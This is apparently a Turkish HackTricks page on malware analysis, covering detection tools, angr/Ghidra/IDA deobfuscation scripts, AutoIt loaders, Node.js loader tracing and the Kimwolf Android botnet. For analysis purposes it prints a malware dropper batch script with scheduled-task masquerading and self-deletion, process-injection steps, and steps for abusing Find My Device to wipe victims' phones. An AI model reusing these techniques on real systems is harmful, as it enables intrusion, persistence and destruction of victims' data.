# Malware Analysis

{{#include ../../banners/hacktricks-training.md}}

## Adli Bilişim CheatSheets

[https://www.jaiminton.com/cheatsheet/DFIR/#](https://www.jaiminton.com/cheatsheet/DFIR/)

## Çevrimiçi Hizmetler

- [VirusTotal](https://www.virustotal.com/gui/home/upload)
- [HybridAnalysis](https://www.hybrid-analysis.com)
- [Koodous](https://koodous.com)
- [Intezer](https://analyze.intezer.com)
- [Any.Run](https://any.run/)

## Çevrimdışı Antivirüs ve Tespit Araçları

### Yara

#### Kurulum
```bash
sudo apt-get install -y yara
```
#### Kuralları hazırla

Bu script'i, tüm yara malware kurallarını github'dan indirip birleştirmek için kullanın: [https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9](https://gist.github.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9)\  
_**rules**_ dizinini oluşturun ve çalıştırın. Bu işlem, tüm yara kurallarını içeren _**malware_rules.yar**_ adlı bir dosya oluşturacaktır.
```bash
wget https://gist.githubusercontent.com/andreafortuna/29c6ea48adf3d45a979a78763cdc7ce9/raw/4ec711d37f1b428b63bed1f786b26a0654aa2f31/malware_yara_rules.py
mkdir rules
python malware_yara_rules.py
```
#### Tarama
```bash
yara -w malware_rules.yar image  #Scan 1 file
yara -w malware_rules.yar folder #Scan the whole folder
```
#### YaraGen: malware kontrolü ve kural oluşturma

Bir ikili dosyadan yara rules oluşturmak için [**YaraGen**](https://github.com/Neo23x0/yarGen) aracını kullanabilirsiniz. Bu eğitimlere göz atın: [**Part 1**](https://www.nextron-systems.com/2015/02/16/write-simple-sound-yara-rules/), [**Part 2**](https://www.nextron-systems.com/2015/10/17/how-to-write-simple-but-sound-yara-rules-part-2/), [**Part 3**](https://www.nextron-systems.com/2016/04/15/how-to-write-simple-but-sound-yara-rules-part-3/)
```bash
python3 yarGen.py --update
python3.exe yarGen.py --excludegood -m  ../../mals/
```
### ClamAV

#### Kurulum
```
sudo apt-get install -y clamav
```
#### Tarama
```bash
sudo freshclam      #Update rules
clamscan filepath   #Scan 1 file
clamscan folderpath #Scan the whole folder
```
### [Capa](https://github.com/mandiant/capa)

**Capa**, çalıştırılabilir dosyalarda: PE, ELF, .NET, potansiyel olarak kötü amaçlı olabilecek **capabilities**'leri tespit eder. Bu sayede Att\&ck tactics gibi öğeleri veya aşağıdaki gibi şüpheli capabilities'leri bulur:

- check for OutputDebugString error
- run as a service
- create process

Edinin: [**Github repo**](https://github.com/mandiant/capa).

### IOCs

IOC, Indicator Of Compromise anlamına gelir. IOC, potansiyel istenmeyen yazılımları veya doğrulanmış **malware**'i tanımlayan **koşullar kümesidir**. Blue Teams bu tür tanımları kendi **sistemlerinde** ve **ağlarında** bu tür kötü amaçlı dosyaları **arama** için kullanır.\
Bu tanımların paylaşılması çok faydalıdır; çünkü bir bilgisayarda malware tespit edildiğinde ve o malware için bir IOC oluşturulduğunda, diğer Blue Teams bunu malware'i daha hızlı tespit etmek için kullanabilir.

IOC'leri oluşturmak veya değiştirmek için bir araç [**IOC Editor**](https://www.fireeye.com/services/freeware/ioc-editor.html).\
Belirlenmiş IOC'leri bir cihazda **arama** için [**Redline**](https://www.fireeye.com/services/freeware/redline.html) gibi araçları kullanabilirsiniz.

### Loki

[**Loki**](https://github.com/Neo23x0/Loki) Simple Indicators of Compromise için bir tarayıcıdır.\
Tespit dört tespit yöntemine dayanır:
```
1. File Name IOC
Regex match on full file path/name

2. Yara Rule Check
Yara signature matches on file data and process memory

3. Hash Check
Compares known malicious hashes (MD5, SHA1, SHA256) with scanned files

4. C2 Back Connect Check
Compares process connection endpoints with C2 IOCs (new since version v.10)
```
### Linux Malware Detect

[**Linux Malware Detect (LMD)**](https://www.rfxn.com/projects/linux-malware-detect/) Linux için GNU GPLv2 lisansı altında yayımlanan bir malware tarayıcısıdır; paylaşılan barındırma ortamlarında karşılaşılan tehditlere göre tasarlanmıştır. Saldırılarda aktif olarak kullanılan malware'ları çıkarmak ve tespiti için imzalar oluşturmak amacıyla network edge intrusion detection systems'ten elde edilen tehdit verilerini kullanır. Ayrıca, tehdit verileri LMD checkout feature ile kullanıcı gönderimleri ve malware topluluğu kaynaklarından da türetilir.

### rkhunter

Tools like [**rkhunter**](http://rkhunter.sourceforge.net) dosya sistemini olası **rootkits** ve malware için kontrol etmek amacıyla kullanılabilir.
```bash
sudo ./rkhunter --check -r / -l /tmp/rkhunter.log [--report-warnings-only] [--skip-keypress]
```
### FLOSS

[**FLOSS**](https://github.com/mandiant/flare-floss) farklı teknikler kullanarak yürütülebilir dosyalar içindeki obfuscated dizeleri bulmaya çalışır.

### PEpper

[PEpper ](https://github.com/Th3Hurrican3/PEpper) yürütülebilir dosya içinde bazı temel bilgileri kontrol eder (ikili veri, entropi, URL'ler ve IP'ler, bazı yara kuralları).

### PEstudio

[PEstudio](https://www.winitor.com/download) imports, exports, headers gibi Windows yürütülebilirleri hakkında bilgi edinmeyi sağlar; ayrıca VirusTotal'u kontrol eder ve potansiyel Att\&ck tekniklerini bulur.

### Detect It Easy(DiE)

[**DiE**](https://github.com/horsicq/Detect-It-Easy/) bir dosyanın **encrypted** olup olmadığını tespit etmek ve ayrıca **packers**'ı bulmak için kullanılan bir araçtır.

### NeoPI

[**NeoPI** ](https://github.com/CiscoCXSecurity/NeoPI)is bir Python scripti olup metin/script dosyaları içindeki **obfuscated** ve **encrypted** içeriği tespit etmek için çeşitli **statistical methods** kullanır. NeoPI'nin amacı gizli **web shell** kodunun **detection**'ına yardımcı olmaktır.

### **php-malware-finder**

[**PHP-malware-finder**](https://github.com/nbs-system/php-malware-finder) **obfuscated**/**dodgy code**'u tespit etmeye çalışır ve ayrıca sıkça **malwares**/webshell'lerde kullanılan **PHP** fonksiyonlarını kullanan dosyaları bulur.

### Apple Binary Signatures

Bazı **malware sample**'larını incelerken, binary'in **signature**'ını her zaman kontrol etmelisiniz; çünkü imzalayan **developer** hâlihazırda **malware** ile **related** olabilir.
```bash
#Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

#Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

#Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app
```
## Tespit Teknikleri

### File Stacking

Eğer bir web server'ın **dosyalarını** içeren bir klasörün **en son belli bir tarihte güncellendiğini** biliyorsanız, web server'daki tüm **dosyaların** oluşturulma ve değiştirilme **tarihlerini** **kontrol edin**; herhangi bir tarih **şüpheli** ise o dosyayı inceleyin.

### Baselines

Eğer bir klasörün dosyalarının **değiştirilmemesi** gerekiyorsa, klasörün **orijinal dosyalarının hash**'ini hesaplayıp bunları **mevcut** olanlarla **karşılaştırabilirsiniz**. Değişen herhangi bir şey **şüpheli** olacaktır.

### Statistical Analysis

Bilgiler loglarda saklanıyorsa, **her bir web server dosyasına kaç kez erişildiği gibi istatistikleri kontrol edebilirsiniz**, çünkü bir web shell en çok erişilenlerden biri olabilir.

---

### Android in-app native telemetry (no root)

Android üzerinde hedef uygulama sürecinin içinde native kodu, diğer JNI kütüphaneleri initialize olmadan önce küçük bir logger kütüphanesini preload ederek enstrümente edebilirsiniz. Bu, sistem genelindeki hooklar veya root gerektirmeden native davranış hakkında erken görünürlük sağlar. Popüler bir yaklaşım SoTap'tır: ilgili ABI için libsotap.so'yu APK'ya koyup System.loadLibrary("sotap") çağrısını erken bir noktaya (ör. static initializer veya Application.onCreate) enjekte edin, sonra logları internal/external yollar veya Logcat fallback üzerinden toplayın.

Kurulum detayları ve log yolları için Android native reversing sayfasına bakın:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/reversing-native-libraries.md
{{#endref}}

---

### Android/JNI native string deobfuscation with angr + Ghidra

Bazı Android malware'leri ve RASP korumalı uygulamalar JNI metod isimlerini ve imzalarını RegisterNatives çağrılmadan önce runtime'da decode ederek gizlerler. Frida/ptrace enstrümantasyonu anti-debug tarafından durdurulduğunda bile, binary içindeki decoder'ı angr ile çalıştırıp düz metni offline olarak elde edebilir ve sonuçları Ghidra'ya yorum olarak geri yazabilirsiniz.

Temel fikir: .so içindeki decoder'ı çağrılabilir bir fonksiyon gibi ele almak, .rodata'daki karartılmış byte blokları üzerinde çalıştırmak ve çıkış byte'larını ilk \x00'ye (C-string terminator) kadar somutlaştırmaktır. Adres uyuşmazlıklarını önlemek için angr ve Ghidra'nın aynı image base'i kullanmasını sağlayın.

İş akışı genel bakışı
- Ghidra'da ön inceleme: decoder'ı ve JNI_OnLoad ile RegisterNatives kurulumundaki çağrı konvansiyonu/argümanlarını belirleyin.
- Her hedef string için decoder'ı çalıştırmak ve sonuçları dökmek üzere angr (CPython3) çalıştırın.
- Ghidra'da notlandırma: hızlı JNI yeniden yapılandırması için her çağrı noktasında çözümlenmiş stringleri otomatik yorum olarak ekleyin.

Ghidra triage (JNI_OnLoad pattern)
- Ghidra'nın JNINativeMethod yapılarını tanıması için JNI_OnLoad'a JNI veri tiplerini uygulayın.
- Oracle dokümanlarına göre tipik JNINativeMethod:

```c
typedef struct {
char *name;      // e.g., "nativeFoo"
char *signature; // e.g., "()V", "()[B"
void *fnPtr;     // native implementation address
} JNINativeMethod;
```
- RegisterNatives çağrılarını arayın. Eğer kütüphane ismi/signature'ı yerel bir rutinle (ör. FUN_00100e10) oluşturuyor, bu rutin statik bir byte tablosuna (ör. DAT_00100bf4) referans veriyor ve (encoded_ptr, out_buf, length) gibi parametreler alıyorsa, bu offline çalıştırma için ideal bir hedeftir.

angr setup (execute the decoder offline)
- .so dosyasını Ghidra'da kullanılanla aynı base ile (örnek: 0x00100000) yükleyin ve durumu küçük tutmak için harici kütüphanelerin otomatik yüklenmesini devre dışı bırakın.

<details>
<summary>angr kurulumu ve offline decoder çalıştırma</summary>
```python
import angr, json

project = angr.Project(
'/path/to/libtarget.so',
load_options={'main_opts': {'base_addr': 0x00100000}},
auto_load_libs=False,
)

ENCODING_FUNC_ADDR = 0x00100e10  # decoder function discovered in Ghidra

def decode_string(enc_addr, length):
# fresh blank state per evaluation
st = project.factory.blank_state()
outbuf = st.heap.allocate(length)
call = project.factory.callable(ENCODING_FUNC_ADDR, base_state=st)
ret_ptr = call(enc_addr, outbuf, length)  # returns outbuf pointer
rs = call.result_state
raw = rs.solver.eval(rs.memory.load(ret_ptr, length), cast_to=bytes)
return raw.split(b'\x00', 1)[0].decode('utf-8', errors='ignore')

# Example: decode a JNI signature at 0x100933 of length 5 → should be ()[B
print(decode_string(0x00100933, 5))
```
</details>

- Büyük ölçekte, call sites ile decoder'ın argümanları (encoded_ptr, size) arasında statik bir eşleme oluşturun. Wrappers argümanları gizleyebilir, bu yüzden API recovery gürültülüysa bu eşlemeyi Ghidra xrefs'ten manuel olarak oluşturabilirsiniz.

<details>
<summary>Toplu olarak birden fazla call sites'i angr ile decode et</summary>
```python
# call_site -> (encoded_addr, size)
call_site_args_map = {
0x00100f8c: (0x00100b81, 0x41),
0x00100fa8: (0x00100bca, 0x04),
0x00100fcc: (0x001007a0, 0x41),
0x00100fe8: (0x00100933, 0x05),
0x0010100c: (0x00100c62, 0x41),
0x00101028: (0x00100c15, 0x16),
0x00101050: (0x00100a49, 0x101),
0x00100cf4: (0x00100821, 0x11),
0x00101170: (0x00100940, 0x101),
0x001011cc: (0x0010084e, 0x13),
0x00101334: (0x001007e9, 0x0f),
0x00101478: (0x0010087d, 0x15),
0x001014f8: (0x00100800, 0x19),
0x001015e8: (0x001008e6, 0x27),
0x0010160c: (0x00100c33, 0x13),
}

decoded_map = { hex(cs): decode_string(enc, sz)
for cs, (enc, sz) in call_site_args_map.items() }

import json
print(json.dumps(decoded_map, indent=2))
with open('decoded_strings.json', 'w') as f:
json.dump(decoded_map, f, indent=2)
```
</details>

Ghidra'da çağrı noktalarına açıklama ekleme
Seçenek A: Sadece Jython ile yorum yazıcı (önceden oluşturulmuş bir JSON kullanın)
- angr CPython3 gerektirdiğinden, obfuskasyonu kaldırma ve açıklama işlemlerini ayrı tutun. Önce yukarıdaki angr script'ini çalıştırarak decoded_strings.json dosyasını oluşturun. Ardından her çağrı noktasına PRE_COMMENTs yazmak için bu Jython GhidraScript'i çalıştırın (ve bağlam için çağıran fonksiyon adını dahil edin):

<details>
<summary>Ghidra Jython script ile çözümlenmiş JNI stringlerini açıklama</summary>
```python
#@category Android/Deobfuscation
# Jython in Ghidra 10/11
import json
from ghidra.program.model.listing import CodeUnit

# Ask for the JSON produced by the angr script
f = askFile('Select decoded_strings.json', 'Load')
mapping = json.load(open(f.absolutePath, 'r'))  # keys as hex strings

fm = currentProgram.getFunctionManager()
rm = currentProgram.getReferenceManager()

# Replace with your decoder address to locate call-xrefs (optional)
ENCODING_FUNC_ADDR = 0x00100e10
enc_addr = toAddr(ENCODING_FUNC_ADDR)

callsite_to_fn = {}
for ref in rm.getReferencesTo(enc_addr):
if ref.getReferenceType().isCall():
from_addr = ref.getFromAddress()
fn = fm.getFunctionContaining(from_addr)
if fn:
callsite_to_fn[from_addr.getOffset()] = fn.getName()

# Write comments from JSON
for k_hex, s in mapping.items():
cs = int(k_hex, 16)
site = toAddr(cs)
caller = callsite_to_fn.get(cs, None)
text = s if caller is None else '%s @ %s' % (s, caller)
currentProgram.getListing().setComment(site, CodeUnit.PRE_COMMENT, text)
print('[+] Annotated %d call sites' % len(mapping))
```
</details>

Seçenek B: pyhidra/ghidra_bridge üzerinden tek bir CPython betiği
- Alternatif olarak, aynı CPython sürecinde çalışan angr'dan Ghidra’nın API’sini sürmek için pyhidra veya ghidra_bridge kullanın. Bu, decode_string() çağırıp PRE_COMMENTs'i ara dosya olmadan hemen ayarlamaya izin verir. Mantık Jython betiğini yansıtır: ReferenceManager ile callsite→function haritası oluşturun, angr ile decode edin ve yorumları ayarlayın.

Neden işe yarar ve ne zaman kullanılmalı
- Offline yürütme RASP/anti-debug'i atlatır: stringleri kurtarmak için ptrace veya Frida hook'larına ihtiyaç yoktur.
- Ghidra ve angr base_addr'lerini (örn. 0x00100000) hizalı tutmak, fonksiyon/veri adreslerinin araçlar arasında eşleşmesini sağlar.
- Dekoderler için tekrarlanabilir yöntem: dönüşümü saf bir fonksiyon olarak ele alın, taze bir state içinde bir çıktı tamponu tahsis edin, onu (encoded_ptr, out_ptr, len) ile çağırın, sonra state.solver.eval ile konkretize edip \x00'a kadar olan C-string'leri ayrıştırın.

Notlar ve tuzaklar
- Hedef ABI/calling convention'a uyun. angr.factory.callable mimariye göre birini seçer; argümanlar kaymış görünüyorsa cc'yi açıkça belirtin.
- Eğer dekoder sıfırlanmış çıktı tamponları bekliyorsa, çağrıdan önce state içinde outbuf'u sıfırlarla başlatın.
- Position-independent Android .so için her zaman base_addr sağlayın ki angr içindeki adresler Ghidra'da görülenlerle eşleşsin.
- currentProgram.getReferenceManager() kullanarak call-xrefs'i numaralandırın; uygulama dekoderi ince stub'ların arkasına sarıyor olsa bile.

For angr basics, see: [angr basics](../../reversing/reversing-tools-basic-methods/angr/README.md)

---

## Dinamik Kontrol Akışını Çözme (JMP/CALL RAX Dispatchers)

Modern malware family'leri, Control-Flow Graph (CFG) obfuscation'ı yoğun şekilde suistimal eder: doğrudan bir jump/call yerine hedefi çalışma zamanında hesaplayıp `jmp rax` veya `call rax` yürütürler. Küçük bir *dispatcher* (genellikle dokuz talimat) CPU `ZF`/`CF` flag'lerine bağlı olarak nihai hedefi belirler ve statik CFG kurtarmayı tamamen bozar.

Teknik — SLOW#TEMPEST loader tarafından gösterildiği gibi — yalnızca IDAPython ve Unicorn CPU emulatorüne dayanan üç adımlı bir iş akışıyla yenilebilir.

### 1. Her dolaylı jump / call'ı bulun
```python
import idautils, idc

for ea in idautils.FunctionItems(idc.here()):
mnem = idc.print_insn_mnem(ea)
if mnem in ("jmp", "call") and idc.print_operand(ea, 0) == "rax":
print(f"[+] Dispatcher found @ {ea:X}")
```
### 2. Dispatcher byte-code'ını çıkarın
```python
import idc

def get_dispatcher_start(jmp_ea, count=9):
s = jmp_ea
for _ in range(count):
s = idc.prev_head(s, 0)
return s

start = get_dispatcher_start(jmp_ea)
size  = jmp_ea + idc.get_item_size(jmp_ea) - start
code  = idc.get_bytes(start, size)
open(f"{start:X}.bin", "wb").write(code)
```
### 3. Unicorn ile iki kez emüle et
```python
from unicorn import *
from unicorn.x86_const import *
import struct

def run(code, zf=0, cf=0):
BASE = 0x1000
mu = Uc(UC_ARCH_X86, UC_MODE_64)
mu.mem_map(BASE, 0x1000)
mu.mem_write(BASE, code)
mu.reg_write(UC_X86_REG_RFLAGS, (zf << 6) | cf)
mu.reg_write(UC_X86_REG_RAX, 0)
mu.emu_start(BASE, BASE+len(code))
return mu.reg_read(UC_X86_REG_RAX)
```
Çalıştırın `run(code,0,0)` ve `run(code,1,1)` ile *false* ve *true* dal hedeflerini elde edin.

### 4. Doğrudan jump / call'ı geri yama
```python
import struct, ida_bytes

def patch_direct(ea, target, is_call=False):
op   = 0xE8 if is_call else 0xE9           # CALL rel32 or JMP rel32
disp = target - (ea + 5) & 0xFFFFFFFF
ida_bytes.patch_bytes(ea, bytes([op]) + struct.pack('<I', disp))
```
Yama uyguladıktan sonra, IDA'nın fonksiyonu yeniden analiz etmesini zorlayın, böylece tam CFG ve Hex-Rays çıktısı geri yüklenir:
```python
import ida_auto, idaapi
idaapi.reanalyze_function(idc.get_func_attr(ea, idc.FUNCATTR_START))
```
### 5. Dolaylı API çağrılarını etiketleyin

Her `call rax`'in gerçek hedefi belirlendikten sonra IDA'ya bunun ne olduğunu söyleyebilirsiniz; böylece parametre türleri ve değişken adları otomatik olarak yeniden oluşturulur:
```python
idc.set_callee_name(call_ea, resolved_addr, 0)  # IDA 8.3+
```
### Pratik faydalar

* Gerçek CFG'yi geri yükler → decompilation *10* satırdan binlerce satıra çıkar.
* string-cross-reference & xrefs'i etkinleştirir; behaviour reconstruction'ı trivial hale getirir.
* Scripts yeniden kullanılabilir: aynı trik ile korunan herhangi bir loader'a koyun.

---

## AutoIt tabanlı loaders: .a3x decryption, Task Scheduler masquerade and RAT injection

This intrusion pattern chains a signed MSI, AutoIt loaders compiled to .a3x, and a Task Scheduler job masquerading as a benign app.

### MSI → custom actions → AutoIt orchestrator

MSI custom actions tarafından yürütülen süreç ağacı ve komutlar:

- MsiExec.exe → cmd.exe (install.bat'ı çalıştırmak için)
- WScript.exe (aldatıcı bir hata diyalogu göstermek için)
```cmd
%SystemRoot%\system32\cmd.exe /c %APPDATA%\스트레스 클리어\install.bat
%SystemRoot%\System32\WScript.exe %APPDATA%\스트레스 클리어\error.vbs
```
install.bat (loader bırakır, persistence ayarlar, self-cleans):
```bat
@echo off
set dr=Music

copy "%~dp0AutoIt3.exe" %public%\%dr%\AutoIt3.exe
copy "%~dp0IoKlTr.au3" %public%\%dr%\IoKlTr.au3

cd /d %public%\%dr% & copy c:\windows\system32\schtasks.exe hwpviewer.exe ^
& hwpviewer /delete /tn "IoKlTr" /f ^
& hwpviewer /create /sc minute /mo 1 /tn "IoKlTr" /tr "%public%\%dr%\AutoIt3.exe %public%\%dr%\IoKlTr.au3"

del /f /q "%~dp0AutoIt3.exe"
del /f /q "%~dp0IoKlTr.au3"
del /f /q "%~f0"
```
error.vbs (kullanıcı aldatmacası):
```vb
MsgBox "현재 시스템 언어팩과 프로그램 언어팩이 호환되지 않아 실행할 수 없습니다." & vbCrLf & _
"설정에서 한국어(대한민국) 언어팩을 설치하거나 변경한 뒤 다시 실행해 주세요.", _
vbCritical, "언어팩 오류"
```
Key artifacts and masquerade:
- AutoIt3.exe ve IoKlTr.au3 dosyalarını C:\Users\Public\Music konumuna bırakır
- schtasks.exe'i hwpviewer.exe olarak kopyalar (Hangul Word Processor görüntüleyicisi gibi maskeleyerek)
- Her 1 dakikada bir çalışan "IoKlTr" adlı zamanlanmış görev oluşturur
- Başlangıç LNK'si Smart_Web.lnk olarak görülür; mutex: `Global\AB732E15-D8DD-87A1-7464-CE6698819E701`
- Modülleri %APPDATA%\Google\Browser\ alt klasörlerine (içinde `adb` veya `adv` bulunan) yerleştirir ve autoit.vbs/install.bat yardımcılarıyla başlatır

Forensic triage tips:
- schtasks sorgulama: `schtasks /query /fo LIST /v | findstr /i "IoKlTr hwpviewer"`
- Task XML ile aynı yerde bulunan ve yeniden adlandırılmış schtasks.exe kopyalarını arayın: `dir /a "C:\Users\Public\Music\hwpviewer.exe"`
- Yaygın yollar: `C:\Users\Public\Music\AutoIt3.exe`, `...\IoKlTr.au3`, Startup `Smart_Web.lnk`, `%APPDATA%\Google\Browser\(adb|adv)*`
- Süreç oluşumunu ilişkilendir: AutoIt3.exe'in meşru Windows ikili dosyalarını (ör. cleanmgr.exe, hncfinder.exe) başlatması

### AutoIt loaders and .a3x payload decryption → injection

- AutoIt modülleri `#AutoIt3Wrapper_Outfile_type=a3x` ile derlenir ve zararsız süreçlere enjekte etmeden önce gömülü payload'ları şifre çözer.
- Gözlemlenen aileler: QuasarRAT (hncfinder.exe içine enjekte edilmiş) ve RftRAT/RFTServer (cleanmgr.exe içine enjekte edilmiş), ayrıca RemcosRAT modülleri (`Remcos\RunBinary.a3x`).
- Şifre çözme deseni: HMAC ile bir AES anahtarı türetmek, gömülü blob'u şifre çözmek ve ardından düz metin modülü enjekte etmek.

Generic decryption skeleton (exact HMAC input/algorithm is family-specific):
```python
import hmac, hashlib
from Crypto.Cipher import AES

def derive_aes_key(secret: bytes, data: bytes) -> bytes:
# Example: HMAC-SHA256 → first 16/32 bytes as AES key
return hmac.new(secret, data, hashlib.sha256).digest()

def aes_decrypt_cbc(key: bytes, iv: bytes, ct: bytes) -> bytes:
return AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ct)
```
Common injection flow (CreateRemoteThread-style):
- Hedef işlem için CreateProcess (suspended) (ör. cleanmgr.exe)
- VirtualAllocEx + WriteProcessMemory ile şifre çözülmüş module/shellcode yazma
- Payload'i çalıştırmak için CreateRemoteThread veya QueueUserAPC

Hunting ideas
- MsiExec.exe veya WScript.exe tarafından parent edilmiş AutoIt3.exe'nin sistem yardımcı programları başlatması
- Genel veya kullanıcı yazılabilir dizinlerde `.a3x` uzantılı dosyalar veya AutoIt script runner'ları
- Dakika düzeyinde tetikleyicilere sahip, AutoIt3.exe çalıştıran veya Microsoft tarafından imzalanmamış ikili dosyaları çalıştıran şüpheli zamanlanmış görevler

### Account-takeover abuse of Android Find My Device (Find Hub)

Windows ihlali sırasında operatörler, çalınmış Google kimlik bilgilerini kullanarak kurbanın Android cihazlarını tekrar tekrar sildiler, bildirimleri bastırdılar ve aynı zamanda kurbanın oturum açmış masaüstü messenger'ı üzerinden erişimi genişlettiler.

Operatör adımları (oturum açmış bir tarayıcı oturumundan):
- Google Account → Security → Your devices'i inceleyin; Find My Phone → Find Hub (https://www.google.com/android/find) yolunu takip edin
- Cihazı seçin → Google şifresini tekrar girin → "Erase device" (fabrika ayarlarına sıfırlama) komutunu verin; kurtarmayı geciktirmek için tekrarlayın
- Opsiyonel: güvenlik bildirimlerini gizlemek için bağlı posta kutusundaki (ör. Naver) uyarı e-postalarını temizleyin

## Tracing heavily obfuscated Node.js loaders

Saldırganlar giderek daha fazla JavaScript loader'larını runtime'ın script ile birlikte taşınması için [`nexe`](https://github.com/nexe/nexe) ile derlenmiş bağımsız Windows ikili dosyalarına paketliyor. Ortaya çıkan PE genellikle 60–90 MB aralığında oluyor ve Node.js yüklü olmasa bile çalışıyor. Triage sırasında:

- Gömülü JavaScript'i PE'den çıkarmak ve statik diff için yerel araçlara vermek için [`nexe_unpacker`](https://npm.io/package/nexe_unpacker) kullanın.
- `%TEMP%` içinde disk-tabanlı bir mutex bekleyin (GachiLoader ~5 dakika sonra süresi dolan rastgele `<name>.lock` dosyası bırakır). Çalıştırmadan önce dosyayı sandbox'a kopyalamak gereksiz aşamaları atlamanıza izin verirken daha sonraki payload'ları görmenizi sağlar.

### Node.js API tracing to defeat anti-analysis

Check Point’in [Nodejs-Tracer](https://github.com/CheckPointSW/Nodejs-Tracer) herhangi bir Node.js sürecinin içinde core modüllere hook atar, anti-VM probe'larını taklit etmenize izin verir ve sample'ın yazdığı her artefakti korur. Analistin kontrol ettiği instrumentasyonun çağrı yığını içinde kalmasını sağlamak için obfuskasyonlu scriptleri tracer üzerinden başlatın:
```powershell
node -r .\tracer.js main.js
```
`tracer.js` içindeki ana yapılandırma anahtarları şunu yapmanıza izin verir:

- Dosya sistemi, child-process ve HTTP etkinliklerini kaydetme (`LOG_HTTP_REQUESTS`, `SAVE_FILE_WRITES`). Her bırakılan dosya—ör. `kidkadi.node`—malware silmeden önce çalışma dizinine kopyalanır.
- Gerçekçi RAM/CPU sayıları döndürerek, `tasklist` çıktısını taklit ederek ve PowerShell/WMI yanıtlarına müdahale ederek ortam parmak izlerini geçersiz kılma. Bu, ≥4 GB RAM, ≥2 çekirdek talep eden ve kullanıcı adlarını (`mashinesssss`, `wdagutilityaccount`, vb.), host adlarını (`desktop-vrsqlag`, `server1` …) ve process adlarını (`vmtoolsd.exe`, `fiddler.exe`, `x64dbg.exe`, `frida-server.exe`) inceleyen loader'ları atlatır.
- `Get-WmiObject Win32_DiskDrive` (içinde `vmware`, `kvm`, `virtio`, … arayan), `Win32_VideoController` (“VirtualBox Graphics Adapter”, “Hyper-V Video”, vb. bloklayan) ve `Win32_PortConnector` sayımları gibi WMI donanım kontrollerini etkisiz hale getirme. Bu probe'lar “gerçek” donanım raporladığında, sandboxlar GachiLoader'ın analiz süresini boşa harcamak için kullandığı `linkedin.com`, `grok.com`, `whatsapp.com` ve benzeri domain'lere yapılan zararsız `Invoke-WebRequest` çağrılarının sonsuz döngüsüne artık takılmaz.

### Capturing gated C2 traffic automatically

Tracer'ın ağ hook'ları, JavaScript obfuscation'ını tersine çevirmeden çok katmanlı C2 kimlik doğrulamayı ortaya çıkarır. Gözlemlenen kampanyada loader şunları yapar:

1. Her hard-coded C2'ye host telemetrisini `/log`'a POST eder.
2. `X-Secret: gachifamily` ile `GET /richfamily/<per-sample key>` isteği yaparak Base64-encoded payload URL'si alır.
3. O URL'e uzun per-sample `X-Secret` header'ı ile final bir `GET` yapar; bu header eksikse `403 Forbidden` döner.

Tracer tam istekleri (header'lar, body'ler, hedefler) kaydettiği için aynı trafiği yeniden oynatarak payload'ları çekebilir, Themida/VMProtect kabuklarını belleğe dökebilir ve Rhadamanthys konfigürasyon verilerini ölçeklenebilir şekilde çıkarabilirsiniz.

## AdaptixC2: Configuration Extraction and TTPs

Ayrıntılı sayfaya bakın:

{{#ref}}
adaptixc2-config-extraction-and-ttps.md
{{#endref}}

## Kimwolf Android Botnet Tradecraft

### APK loader & native ELF execution on TV boxes
- Kötü amaçlı APK'lar (ör. `com.n2.systemservice06*`) `res/raw` içinde statically linked ARM ELF taşır (ör. `R.raw.libniggakernel`). Bir `BOOT_COMPLETED` receiver başlatmada çalışır, raw resource'u uygulama sandbox'una (ör. `/data/data/<pkg>/niggakernel`) çıkarır, yürütülebilir yapar ve `su` ile çağırır.
- Birçok Android TV box/tablet önceden rootlu imajlar veya world-writable `su` ile geldiğinden, loader exploit zinciri olmadan bile ELF'i UID 0 ile güvenilir şekilde başlatır. Kalıcılık “bedava” gelir çünkü receiver her reboot veya uygulama yeniden başlatmasında yeniden tetiklenir.
- Bu paterni arayan reverse engineer'lar gizli boot receiver'lar için `AndroidManifest.xml` üzerinde diff alabilir ve `Resources.openRawResource` → `FileOutputStream` → `Runtime.getRuntime().exec("su")` referanslarını arayabilir. ELF bırakıldıktan sonra, onu bir Linux userland backdoor'u olarak triage edin (Kimwolf UPX-packed, stripped, statically linked, 32-bit ARM EABI5).

### Runtime mutexes & masquerading IOCs
- Başlangıçta Kimwolf, `@niggaboxv4`/`@niggaboxv5` gibi bir **abstract UNIX domain socket**'e bind eder. Mevcut soketler çıkışı zorunlu kıldığından, soket adı hem bir mutex hem de adli bir eser olarak çalışır.
- Process başlığı service-benzeri isimlerle (`netd_services`, `tv_helper`, vb.) üzerine yazılarak Android process listelerine karışılır. Host-tabanlı tespitler bu isimleri mutex soketiyle birlikte izleyebilir.

### Stack XOR string decoding with ARM NEON + flare_emu
- Hassas string'ler (C2 domainleri, resolver'lar, DoT endpoint'leri) şifrelenmiş 8 baytlık bloklar halinde stack'e itilir ve `VEOR Qx, Qx, Qy` (`veorq_s64`) ile yerinde decode edilir. Analistler decryptor her defasında çözülen pointer'ı caller'a verdiğinde bunu yakalamak için **flare_emu** ile script yazabilirler:
```python
import flare_emu

eh = flare_emu.EmuHelper()

def hook(eh, addr, argv, _):
if eh.isValidEmuPtr(argv[1]):
print(hex(addr), eh.getEmuString(argv[1]))

eh.iterate(0x8F00, hook)  # sub_8F00 consumes the plaintext R1 argument
```
- `VEOR Q8, Q8, Q9` / `veorq_s64` dizilerini aramak ve bunların aralıklarını emüle etmek, her çözülen dizeyi topluca döker ve plaintext'in stack-only lifetime'ını atlatır.

### DNS-over-TLS resolution plus XOR IP derivation
- Tüm Kimwolf varyantları C2 domainlerini doğrudan **DNS-over-TLS (TCP/853)** ile Google (8.8.8.8) veya Cloudflare (1.1.1.1) üzerinden çözerek düz DNS loglamasını veya hijack'i etkisizleştirir.
- v4 botlar dönen IPv4 A kaydını doğrudan kullanır. v5 botlar A kaydını 32-bit bir tamsayı olarak ele alır, endianness'ini çevirir, sabit `0x00ce0491` ile XOR'lar, sonra gerçek C2 IP'sini elde etmek için endianness'i tekrar çevirir. CyberChef tarifi: Change IP format → swap endianness per 4-byte chunk → XOR with `00 ce 04 91` → convert back to dotted decimal.

### ENS / EtherHiding fallback
- Daha sonraki sürümler bir ENS domaini (`pawsatyou.eth`) ekler; bunun resolver text key'i `"lol"` görünüşte zararsız bir IPv6 (`fed0:5dec:...:1be7:8599`) tutar.
